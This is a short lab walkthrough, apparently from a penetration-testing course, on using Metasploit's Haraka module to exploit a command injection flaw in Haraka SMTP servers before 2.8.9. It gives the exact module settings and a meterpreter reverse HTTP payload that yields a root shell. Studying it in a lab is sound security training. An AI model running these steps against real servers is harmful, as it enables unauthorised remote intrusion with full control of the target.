# Exploiting a Vulnerable SMTP Server

+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.

+ SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.

+ Haraka is an open source high performance SMTP server developed in Node.js.

+ The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to V2.8.9 are vulnerable to command injection.

## Laboratory

- Start the postgresql server by running `service postgresql start`.

- Start the msfconsole and check the database status.

- Create a new workspace and import your nmap scan results. We can name it haraka for this example.

- Set globally the target IP with `setg RHOSTS $TARGET_IP`, do this for the RHOST option as well.

- We can start by using db_nmap to start scanning the target machine. Or you can import them from an external xls nmap result file.

**Note**: The target machine is the next ip after your ip address. If your ip is x.x.x.2, the target IP will be x.x.x.3.

- We are going to make a quick search for the module `search type:exploit name:haraka` and we should find the module `exploit/linux/smtp/haraka`. For this module we will need to set the right SRVHOST and SRVPORT, the email_from and the email_to test addresses, and the payload we want to execute on the target. We can use the following values in this example:

    + SRVHOST: 0.0.0.0
    + SRVPORT: 9898 (Random port)
    + email_to: root@attackdefense.test (must be accepted by the remote server, in this case root@attackdefense.test is accepted)
    + payload: linux/x64/meterpreter_reverse_http (preferable a non-staged payload)
    + LHOST: eth1 (or your ip address)

**Note**: SRVPORT default value is 8080, but as we need that port number for the http payload, we are going to change it to 9898.

- The payload should execute swiftly and provide a meterpreter session right away with elevated privileges (root).
